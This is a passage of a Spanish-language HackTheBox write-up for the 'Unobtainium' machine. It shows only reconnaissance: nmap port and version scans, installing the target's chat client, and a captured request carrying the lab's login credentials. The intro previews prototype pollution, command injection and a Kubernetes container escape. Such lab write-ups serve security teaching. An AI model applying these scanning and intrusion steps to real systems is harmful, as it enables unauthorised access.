Gallery</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/lazy-admin/><img src=/writeups/tryhackme/lazy-admin//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>
Lazy admin</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/mr.robot/><img src=/writeups/tryhackme/mr.robot//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>
Mr.Robot</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/mustacchio/><img src=/writeups/tryhackme/mustacchio//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>
Mustacchio</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/overpass/><img src=/writeups/tryhackme/overpass//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>
Overpass</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/pickle-rick/><img src=/writeups/tryhackme/pickle-rick//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>
Pickle Rick</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/rootme/><img src=/writeups/tryhackme/rootme//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>
RootMe</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/source/><img src=/writeups/tryhackme/source//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>
Source</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/startup/><img src=/writeups/tryhackme/startup//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>
Startup</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/team/><img src=/writeups/tryhackme/team//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>
Team</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/tomghost/><img src=/writeups/tryhackme/tomghost//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>
Tomghost</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/vulnversity/><img src=/writeups/tryhackme/vulnversity//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>
Vulnversity</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/wgel/><img src=/writeups/tryhackme/wgel//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>
Wgel</a></li><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/tryhackme/wonderland/><img src=/writeups/tryhackme/wonderland//logo.png alt=Logo style=width:20px;height:auto;margin-right:10px>
Wonderland</a></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-899f9e1034ad8d41a30f4792e02699a8 aria-expanded=false>
HackMyVm</button><div class=collapse id=section-899f9e1034ad8d41a30f4792e02699a8><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/hackmyvm/liceo/>Liceo</a></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-ccdabd144af006c40e0937d3f87d7afa aria-expanded=false>
VulnHub</button><div class=collapse id=section-ccdabd144af006c40e0937d3f87d7afa><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"><li style=display:flex;align-items:stretch><a class="docs-link rounded" href=/writeups/vulnhub/brainpan-1/>Brainpan 1</a></li></ul></div></li><li class=mb-1><button class="btn btn-toggle align-items-center rounded collapsed" data-bs-toggle=collapse data-bs-target=#section-21d2fe7c61cab1f4db96535ccdbf2fb9 aria-expanded=false>
Dockerlabs</button><div class=collapse id=section-21d2fe7c61cab1f4db96535ccdbf2fb9><ul class="btn-toggle-nav list-unstyled fw-normal pb-1 small"></ul></div></li></ul></nav></div><nav class="docs-toc docs-toc-offset d-none d-xl-block col-xl-3" aria-label="Secondary navigation"><div class=page-links><h3>On this page</h3><nav id=toc><ul><li><ul><li><a href=#reconocimiento>Reconocimiento</a><ul><li><a href=#escaneo-de-puertos>Escaneo de puertos</a></li></ul></li><li><a href=#app>App</a></li><li><a href=#escalada-de-privilegios>Escalada de privilegios</a></li></ul></li></ul></nav></div></nav><main class="docs-content col-lg-11 col-xl-9"><nav aria-label=breadcrumb><ol class=breadcrumb><li class=breadcrumb-item><a href=/>Home</a></li><li class=breadcrumb-item><a href=/writeups/>Writeups</a></li><li class=breadcrumb-item><a href=/writeups/hackthebox/>HackTheBox</a></li><li class="breadcrumb-item active" aria-current=page>Unobtainium</li></ol></nav><div style=display:flex;align-items:center><div style="border-left:8px solid #e91414;height:40px;margin-right:10px"></div><h1 style=margin:0;vertical-align:middle>Unobtainium</h1></div><nav class="toc-mobile d-xl-none" aria-label="Quaternary navigation"><details><summary>On this page</summary><div class=page-links><nav id=TableOfContents><ul><li><ul><li><a href=#reconocimiento>Reconocimiento</a><ul><li><a href=#escaneo-de-puertos>Escaneo de puertos</a></li></ul></li><li><a href=#app>App</a></li><li><a href=#escalada-de-privilegios>Escalada de privilegios</a></li></ul></li></ul></nav></div></details></nav><div class=tag-list-single><a class="btn btn-light" href=/tags/prototype-pollution/ role=button>Prototype pollution</a>
<a class="btn btn-light" href=/tags/os-command-injection/ role=button>OS command injection</a>
<a class="btn btn-light" href=/tags/pivoting/ role=button>Pivoting</a>
<a class="btn btn-light" href=/tags/kubernetes/ role=button>Kubernetes</a></div><div style=display:flex;align-items:center;vertical-align:middle><img src=/blog/phishing/images/pingu2.png alt style=width:40px;height:40px;margin-right:10px;vertical-align:middle>
<img src=/blog/phishing/images/htb.png alt style=width:40px;height:40px;margin-right:10px;vertical-align:middle></div><br><p>Comenzamos explotando una vulnerabilidad de prototype pollution. Luego, aprovechamos un CVE de inyecciÃ³n de comandos para ganar una shell en un contenedor. Para la escalada de privilegios, pivotamos entre contenedores de Kubernetes y analizamos los secretos de un namespace. Finalmente, utilizando el permiso para crear pods, logramos salir del contenedor.</p><p><small>June 18, 2024<span class="stretched-link position-relative reading-time" title="Estimated reading time"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 12a9 9 0 1018 0A9 9 0 003 12"/><path d="M12 7v5l3 3"/></svg>18&nbsp;minutes</span></small></p><h2 id=reconocimiento>Reconocimiento<a href=#reconocimiento class=anchor aria-hidden=true>#</a></h2><p>Para empezar lo primero es comprobar si la mÃ¡quina estÃ¡ activa y que OS tiene</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ping -c <span class=m>1</span> 10.10.10.235
</span></span><span class=line><span class=cl>PING 10.10.10.235 <span class=o>(</span>10.10.10.235<span class=o>)</span> 56<span class=o>(</span>84<span class=o>)</span> bytes of data.
</span></span><span class=line><span class=cl><span class=m>64</span> bytes from 10.10.10.235: <span class=nv>icmp_seq</span><span class=o>=</span><span class=m>1</span> <span class=nv>ttl</span><span class=o>=</span><span class=m>63</span> <span class=nv>time</span><span class=o>=</span><span class=m>175</span> ms
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>--- 10.10.10.235 ping statistics ---
</span></span><span class=line><span class=cl><span class=m>1</span> packets transmitted, <span class=m>1</span> received, 0% packet loss, <span class=nb>time</span> 0ms
</span></span><span class=line><span class=cl>rtt min/avg/max/mdev <span class=o>=</span> 175.026/175.026/175.026/0.000 ms
</span></span></code></pre></div><p>Tenemos conexiÃ³n y en este caso da un ttl (time to live) de <strong>63</strong>, entendiendo que <strong>ttl=64: Linux</strong> / <strong>ttl=128: Windows</strong>. Esta mÃ¡quina es <strong>Linux</strong></p><h3 id=escaneo-de-puertos>Escaneo de puertos<a href=#escaneo-de-puertos class=anchor aria-hidden=true>#</a></h3><p>Ahora empezamos con un escaneo de puertos</p><pre tabindex=0><code>$ sudo nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.10.235 -oG allPorts
</code></pre><details><summary>ExplicaciÃ³n parÃ¡metros</summary><table><thead><tr><th>ParÃ¡metro</th><th>FunciÃ³n</th></tr></thead><tbody><tr><td>-p-</td><td>Para que el escaneo sea a todos los puertos (65536)</td></tr><tr><td>&ndash;open</td><td>Para que solo reporte los puertos abiertos</td></tr><tr><td>&ndash;min-rate 5000</td><td>Definir el tiempo del escaneo</td></tr><tr><td>-n</td><td>Omitir resoluciÃ³n DNS</td></tr><tr><td>-vvv</td><td>Para que vaya reportando lo que encuentre por consola</td></tr><tr><td>-Pn</td><td>Para saltar la comprobaciÃ³n de sÃ­ la mÃ¡quina estÃ¡ activa o no</td></tr><tr><td>-oG allPorts</td><td>Para que guarde el escaneo en format grepeable en un archivo llamado allPort</td></tr></tbody></table></details><br><p>Con una funciÃ³n definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma mÃ¡s visual</p><p><a href=https://pastebin.com/tYpwpauW>FunciÃ³n extractPorts</a> de <a href=https://s4vitar.github.io>@s4vitar</a></p><pre tabindex=0><code>&gt; extractPorts allPorts
â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
       â”‚ File: extractPorts.tmp
â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
   1   â”‚ 
   2   â”‚ [*] Extracting information...
   3   â”‚ 
   4   â”‚     [*] IP Address: 10.10.10.235
   5   â”‚     [*] Open ports: 22,80,8443,31337,10250,10251
   6   â”‚ 
   7   â”‚ [*] Ports copied to clipboard
   8   â”‚ 
â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
</code></pre><p>Ahora con nmap vamos a intentar buscar las versiones de los servicios que corren por los puertos y ejecutar scripts bÃ¡sicos de reconocimientos de nmap</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; nmap -p22,80,8443,31337,10250,10251 -sCV 10.10.10.235 -oN versions
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PORT      STATE SERVICE       VERSION
</span></span><span class=line><span class=cl>22/tcp    open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 <span class=o>(</span>Ubuntu Linux<span class=p>;</span> protocol 2.0<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey: 
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>3072</span> 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae <span class=o>(</span>RSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f <span class=o>(</span>ECDSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_  <span class=m>256</span> 18ðŸ’¿9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb <span class=o>(</span>ED25519<span class=o>)</span>
</span></span><span class=line><span class=cl>80/tcp    open  http          Apache httpd 2.4.41 <span class=o>((</span>Ubuntu<span class=o>))</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Apache/2.4.41 <span class=o>(</span>Ubuntu<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Unobtainium
</span></span><span class=line><span class=cl>8443/tcp  open  ssl/https-alt
</span></span><span class=line><span class=cl><span class=p>|</span> fingerprint-strings: 
</span></span><span class=line><span class=cl><span class=p>|</span>   FourOhFourRequest: 
</span></span><span class=line><span class=cl><span class=p>|</span>     HTTP/1.0 <span class=m>401</span> Unauthorized
</span></span><span class=line><span class=cl><span class=p>|</span>     Audit-Id: aafb70ca-6fef-48e4-9836-d57c119bed8d
</span></span><span class=line><span class=cl><span class=p>|</span>     Cache-Control: no-cache, private
</span></span><span class=line><span class=cl><span class=p>|</span>     Content-Type: application/json
</span></span><span class=line><span class=cl><span class=p>|</span>     Date: Wed, <span class=m>12</span> Jun <span class=m>2024</span> 22:07:50 GMT
</span></span><span class=line><span class=cl><span class=p>|</span>     Content-Length: <span class=m>129</span>
</span></span><span class=line><span class=cl><span class=p>|</span>     <span class=o>{</span><span class=s2>&#34;kind&#34;</span>:<span class=s2>&#34;Status&#34;</span>,<span class=s2>&#34;apiVersion&#34;</span>:<span class=s2>&#34;v1&#34;</span>,<span class=s2>&#34;metadata&#34;</span>:<span class=o>{}</span>,<span class=s2>&#34;status&#34;</span>:<span class=s2>&#34;Failure&#34;</span>,<span class=s2>&#34;message&#34;</span>:<span class=s2>&#34;Unauthorized&#34;</span>,<span class=s2>&#34;reason&#34;</span>:<span class=s2>&#34;Unauthorized&#34;</span>,<span class=s2>&#34;code&#34;</span>:401<span class=o>}</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   GenericLines, Help, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
</span></span><span class=line><span class=cl><span class=p>|</span>     HTTP/1.1 <span class=m>400</span> Bad Request
</span></span><span class=line><span class=cl><span class=p>|</span>     Content-Type: text/plain<span class=p>;</span> <span class=nv>charset</span><span class=o>=</span>utf-8
</span></span><span class=line><span class=cl><span class=p>|</span>     Connection: close
</span></span><span class=line><span class=cl><span class=p>|</span>     Request
</span></span><span class=line><span class=cl><span class=p>|</span>   GetRequest: 
</span></span><span class=line><span class=cl><span class=p>|</span>     HTTP/1.0 <span class=m>401</span> Unauthorized
</span></span><span class=line><span class=cl><span class=p>|</span>     Audit-Id: ea15ea5d-000a-4a41-a427-8815265b480b
</span></span><span class=line><span class=cl><span class=p>|</span>     Cache-Control: no-cache, private
</span></span><span class=line><span class=cl><span class=p>|</span>     Content-Type: application/json
</span></span><span class=line><span class=cl><span class=p>|</span>     Date: Wed, <span class=m>12</span> Jun <span class=m>2024</span> 22:07:50 GMT
</span></span><span class=line><span class=cl><span class=p>|</span>     Content-Length: <span class=m>129</span>
</span></span><span class=line><span class=cl><span class=p>|</span>     <span class=o>{</span><span class=s2>&#34;kind&#34;</span>:<span class=s2>&#34;Status&#34;</span>,<span class=s2>&#34;apiVersion&#34;</span>:<span class=s2>&#34;v1&#34;</span>,<span class=s2>&#34;metadata&#34;</span>:<span class=o>{}</span>,<span class=s2>&#34;status&#34;</span>:<span class=s2>&#34;Failure&#34;</span>,<span class=s2>&#34;message&#34;</span>:<span class=s2>&#34;Unauthorized&#34;</span>,<span class=s2>&#34;reason&#34;</span>:<span class=s2>&#34;Unauthorized&#34;</span>,<span class=s2>&#34;code&#34;</span>:401<span class=o>}</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   HTTPOptions: 
</span></span><span class=line><span class=cl><span class=p>|</span>     HTTP/1.0 <span class=m>401</span> Unauthorized
</span></span><span class=line><span class=cl><span class=p>|</span>     Audit-Id: 746cb85a-03d1-4509-8e50-d3911982b1fa
</span></span><span class=line><span class=cl><span class=p>|</span>     Cache-Control: no-cache, private
</span></span><span class=line><span class=cl><span class=p>|</span>     Content-Type: application/json
</span></span><span class=line><span class=cl><span class=p>|</span>     Date: Wed, <span class=m>12</span> Jun <span class=m>2024</span> 22:07:50 GMT
</span></span><span class=line><span class=cl><span class=p>|</span>     Content-Length: <span class=m>129</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_    <span class=o>{</span><span class=s2>&#34;kind&#34;</span>:<span class=s2>&#34;Status&#34;</span>,<span class=s2>&#34;apiVersion&#34;</span>:<span class=s2>&#34;v1&#34;</span>,<span class=s2>&#34;metadata&#34;</span>:<span class=o>{}</span>,<span class=s2>&#34;status&#34;</span>:<span class=s2>&#34;Failure&#34;</span>,<span class=s2>&#34;message&#34;</span>:<span class=s2>&#34;Unauthorized&#34;</span>,<span class=s2>&#34;reason&#34;</span>:<span class=s2>&#34;Unauthorized&#34;</span>,<span class=s2>&#34;code&#34;</span>:401<span class=o>}</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ssl-cert: Subject: <span class=nv>commonName</span><span class=o>=</span>k3s/organizationName<span class=o>=</span>k3s
</span></span><span class=line><span class=cl><span class=p>|</span> Subject Alternative Name: DNS:kubernetes, DNS:kubernetes.default, DNS:kubernetes.default.svc, DNS:kubernetes.default.svc.cluster.local, DNS:localhost, DNS:unobtainium, IP Address:10.10.10.235, IP Address:10.129.136.226, IP Address:10.43.0.1, IP Address:127.0.0.1
</span></span><span class=line><span class=cl><span class=p>|</span> Not valid before: 2022-08-29T09:26:11
</span></span><span class=line><span class=cl><span class=p>|</span>_Not valid after:  2024-10-26T13:35:54
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Site doesn<span class=s1>&#39;t have a title (application/json).
</span></span></span><span class=line><span class=cl><span class=s1>| http-auth: 
</span></span></span><span class=line><span class=cl><span class=s1>| HTTP/1.1 401 Unauthorized\x0D
</span></span></span><span class=line><span class=cl><span class=s1>|_  Server returned status 401 but no WWW-Authenticate header.
</span></span></span><span class=line><span class=cl><span class=s1>10250/tcp open  ssl/http      Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
</span></span></span><span class=line><span class=cl><span class=s1>| ssl-cert: Subject: commonName=unobtainium
</span></span></span><span class=line><span class=cl><span class=s1>| Subject Alternative Name: DNS:unobtainium, DNS:localhost, IP Address:127.0.0.1, IP Address:10.10.10.235
</span></span></span><span class=line><span class=cl><span class=s1>| Not valid before: 2022-08-29T09:26:11
</span></span></span><span class=line><span class=cl><span class=s1>|_Not valid after:  2025-06-12T21:59:31
</span></span></span><span class=line><span class=cl><span class=s1>|_http-title: Site doesn&#39;</span>t have a title <span class=o>(</span>text/plain<span class=p>;</span> <span class=nv>charset</span><span class=o>=</span>utf-8<span class=o>)</span>.
</span></span><span class=line><span class=cl>10251/tcp open  unknown
</span></span><span class=line><span class=cl><span class=p>|</span> fingerprint-strings: 
</span></span><span class=line><span class=cl><span class=p>|</span>   FourOhFourRequest: 
</span></span><span class=line><span class=cl><span class=p>|</span>     HTTP/1.0 <span class=m>404</span> Not Found
</span></span><span class=line><span class=cl><span class=p>|</span>     Cache-Control: no-cache, private
</span></span><span class=line><span class=cl><span class=p>|</span>     Content-Type: text/plain<span class=p>;</span> <span class=nv>charset</span><span class=o>=</span>utf-8
</span></span><span class=line><span class=cl><span class=p>|</span>     X-Content-Type-Options: nosniff
</span></span><span class=line><span class=cl><span class=p>|</span>     Date: Wed, <span class=m>12</span> Jun <span class=m>2024</span> 22:08:10 GMT
</span></span><span class=line><span class=cl><span class=p>|</span>     Content-Length: <span class=m>19</span>
</span></span><span class=line><span class=cl><span class=p>|</span>     page not found
</span></span><span class=line><span class=cl><span class=p>|</span>   GenericLines, Help, Kerberos, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
</span></span><span class=line><span class=cl><span class=p>|</span>     HTTP/1.1 <span class=m>400</span> Bad Request
</span></span><span class=line><span class=cl><span class=p>|</span>     Content-Type: text/plain<span class=p>;</span> <span class=nv>charset</span><span class=o>=</span>utf-8
</span></span><span class=line><span class=cl><span class=p>|</span>     Connection: close
</span></span><span class=line><span class=cl><span class=p>|</span>     Request
</span></span><span class=line><span class=cl><span class=p>|</span>   GetRequest, HTTPOptions: 
</span></span><span class=line><span class=cl><span class=p>|</span>     HTTP/1.0 <span class=m>404</span> Not Found
</span></span><span class=line><span class=cl><span class=p>|</span>     Cache-Control: no-cache, private
</span></span><span class=line><span class=cl><span class=p>|</span>     Content-Type: text/plain<span class=p>;</span> <span class=nv>charset</span><span class=o>=</span>utf-8
</span></span><span class=line><span class=cl><span class=p>|</span>     X-Content-Type-Options: nosniff
</span></span><span class=line><span class=cl><span class=p>|</span>     Date: Wed, <span class=m>12</span> Jun <span class=m>2024</span> 22:07:44 GMT
</span></span><span class=line><span class=cl><span class=p>|</span>     Content-Length: <span class=m>19</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_    page not found
</span></span><span class=line><span class=cl>31337/tcp open  http          Node.js Express framework
</span></span><span class=line><span class=cl><span class=p>|</span> http-methods: 
</span></span><span class=line><span class=cl><span class=p>|</span>_  Potentially risky methods: PUT DELETE
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Site doesn<span class=err>&#39;</span>t have a title <span class=o>(</span>application/json<span class=p>;</span> <span class=nv>charset</span><span class=o>=</span>utf-8<span class=o>)</span>.
</span></span></code></pre></div><details><summary>ExplicaciÃ³n parÃ¡metros</summary><table><thead><tr><th style=text-align:center>ParÃ¡metro</th><th>FunciÃ³n</th></tr></thead><tbody><tr><td style=text-align:center>-p</td><td>Especificamos los puertos abiertos que hemos encontrado con el escaneo anterior</td></tr><tr><td style=text-align:center>-sC</td><td>Para que realice scripts bÃ¡sicos de reconocimiento</td></tr><tr><td style=text-align:center>-sV</td><td>Proporciona la versiÃ³n e informaciÃ³n de los servicios que corren por los puertos</td></tr></tbody></table></details><br><h2 id=app>App<a href=#app class=anchor aria-hidden=true>#</a></h2><p>Comenzamos accediendo al sitio web que se encuentra en el puerto 80.</p><p><img alt class="img-fluid lazyload blur-up" data-sizes=auto data-srcset="/writeups/hackthebox/unobtainium/images/download_hudc749848fc0309c95bcb6acb531522a2_161334_159c4e277cf8b55d36abd33763f5a118.webp 480w, /writeups/hackthebox/unobtainium/images/download_hudc749848fc0309c95bcb6acb531522a2_161334_931006abc072a893478a282c6a8283a7.webp 640w, /writeups/hackthebox/unobtainium/images/download_hudc749848fc0309c95bcb6acb531522a2_161334_b5188185b02ddc611cbc4cd9f687a6a9.webp 800w, /writeups/hackthebox/unobtainium/images/download_hudc749848fc0309c95bcb6acb531522a2_161334_2110c688bd90a618d2bdc3ed513ffd16.webp 1024w" fetchpriority=low height=900 id=h-rh-i-0 src=/writeups/hackthebox/unobtainium/images/download_hudc749848fc0309c95bcb6acb531522a2_161334_5a15b93b31fa98151db668bb9be9b5d1.webp width=1600></p><p>Parece que la mÃ¡quina aloja una aplicaciÃ³n de chat. Desde la pÃ¡gina web, podemos descargar la aplicaciÃ³n.</p><p>Al descargar, obtenemos un archivo comprimido llamado unobtainium_debian.zip.</p><pre tabindex=0><code>&gt; ls | grep unobtainium    

unobtainium_debian.zip
</code></pre><p>DespuÃ©s de descomprimirlo, encontramos un archivo .deb, que instalamos con <code>sudo apt install ./unobtainium_1.0.0_amd64.deb</code>.</p><p>Una vez ya lo tenemos instalado, lo ejecutamos con el comando <code>unobtainium</code>.</p><p>Al ejecutarse, se abre una ventana, que nos dice que no encuentra el dominio unobtainium.htb, para que lo encuentre lo aÃ±adimos en el /etc/hosts apuntando a la ip de la mÃ¡quina vÃ­ctima. Con este mensaje deducimos que la aplicaciÃ³n no funciona solo en local, sino que se conecta a un servidor&mldr;</p><p>La aplicaciÃ³n tiene 3 funciones:</p><p>Message Log:</p><p><img alt class="img-fluid lazyload blur-up" data-sizes=auto data-srcset="/writeups/hackthebox/unobtainium/images/log_hu75bf23b822dad1e7a9eba0da77a7308d_22329_40ff17aa88bf9125b40de069623a83a2.webp 480w, /writeups/hackthebox/unobtainium/images/log_hu75bf23b822dad1e7a9eba0da77a7308d_22329_354479f2d2bac879c9414bd1447e66ac.webp 640w, /writeups/hackthebox/unobtainium/images/log_hu75bf23b822dad1e7a9eba0da77a7308d_22329_c586a923dde5aecf2a4345bdfa3fd984.webp 800w, /writeups/hackthebox/unobtainium/images/log_hu75bf23b822dad1e7a9eba0da77a7308d_22329_a6e35879b3351fdda30eb81782637138.webp 1024w" fetchpriority=low height=900 id=h-rh-i-1 src=/writeups/hackthebox/unobtainium/images/log_hu75bf23b822dad1e7a9eba0da77a7308d_22329_1432b9796c86e26dd382d2e7c3c0ba9c.webp width=1600></p><p>Post Message:</p><p><img alt class="img-fluid lazyload blur-up" data-sizes=auto data-srcset="/writeups/hackthebox/unobtainium/images/post_hud4d1b75af334df9d90da8a829c5d6988_25158_04a20559b7d6760eb12123e44140f453.webp 480w, /writeups/hackthebox/unobtainium/images/post_hud4d1b75af334df9d90da8a829c5d6988_25158_7e3255724490db32d90561d37d797cca.webp 640w, /writeups/hackthebox/unobtainium/images/post_hud4d1b75af334df9d90da8a829c5d6988_25158_1bc21aff26fd90876b02cf249c65e98d.webp 800w, /writeups/hackthebox/unobtainium/images/post_hud4d1b75af334df9d90da8a829c5d6988_25158_ad4bf234fecf5318887448bbc3535a08.webp 1024w" fetchpriority=low height=900 id=h-rh-i-2 src=/writeups/hackthebox/unobtainium/images/post_hud4d1b75af334df9d90da8a829c5d6988_25158_1930bd435b1246786e8b3fc6f5df5550.webp width=1600></p><p>Todo:</p><p><img alt class="img-fluid lazyload blur-up" data-sizes=auto data-srcset="/writeups/hackthebox/unobtainium/images/todo_hu02d48c43b856e6edca9153a5c20ad129_42898_d3f3b7864b42ed1e12aad7d052777dbd.webp 480w, /writeups/hackthebox/unobtainium/images/todo_hu02d48c43b856e6edca9153a5c20ad129_42898_c12f6e1847350fe7edb980fdcc176ed7.webp 640w, /writeups/hackthebox/unobtainium/images/todo_hu02d48c43b856e6edca9153a5c20ad129_42898_f2c910265feeeab05813ba95d291285c.webp 800w, /writeups/hackthebox/unobtainium/images/todo_hu02d48c43b856e6edca9153a5c20ad129_42898_0b0d10a3372f5c19ffd4090f0f590ba7.webp 1024w" fetchpriority=low height=900 id=h-rh-i-3 src=/writeups/hackthebox/unobtainium/images/todo_hu02d48c43b856e6edca9153a5c20ad129_42898_5184e2d399dd2908f362609e7afff388.webp width=1600></p><p>Como vimos antes, esta aplicaciÃ³n se conecta al servidor unobtainium.htb, asi que con wireshark vamos a interceptar que comunicaciones se estÃ¡n produciendo entre la aplicaciÃ³n y el servidor cuando hacemos alguna de las 3 funciones mencionadas anteriormente.</p><p><strong>Post Message:</strong></p><p><img alt class="img-fluid lazyload blur-up" data-sizes=auto data-srcset="/writeups/hackthebox/unobtainium/images/post2_hu389a78f177b89f4cf5c34df116beeaf3_85728_7ad211ae70d5d68535c3b59554b38e3d.webp 480w, /writeups/hackthebox/unobtainium/images/post2_hu389a78f177b89f4cf5c34df116beeaf3_85728_74fb5248842360bc3404db5f889ede2c.webp 640w, /writeups/hackthebox/unobtainium/images/post2_hu389a78f177b89f4cf5c34df116beeaf3_85728_d1f23d5380b837c71062f038b49defdf.webp 800w, /writeups/hackthebox/unobtainium/images/post2_hu389a78f177b89f4cf5c34df116beeaf3_85728_8bf0180d18189b5097e7e21755a0f2f5.webp 1024w" fetchpriority=low height=900 id=h-rh-i-4 src=/writeups/hackthebox/unobtainium/images/post2_hu389a78f177b89f4cf5c34df116beeaf3_85728_91541c6975021804a053b29a233fec72.webp width=1600></p><p>Se estÃ¡ mandando una peticiÃ³n con el mÃ©todo PUT a unobtainium.htb:31337.
Como data estamos mandando en json lo siguiente:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;auth&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;felamos&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;password&#34;</span><span class=p>:</span> <span class=s2>&#34;Winter2021&#34;</span>
</span></span><span class=line><span class=cl>  <span class=p>},</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;message&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;text&#34;</span><span class=p>:</span> <span class=s2>&#34;Testing3&#34;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
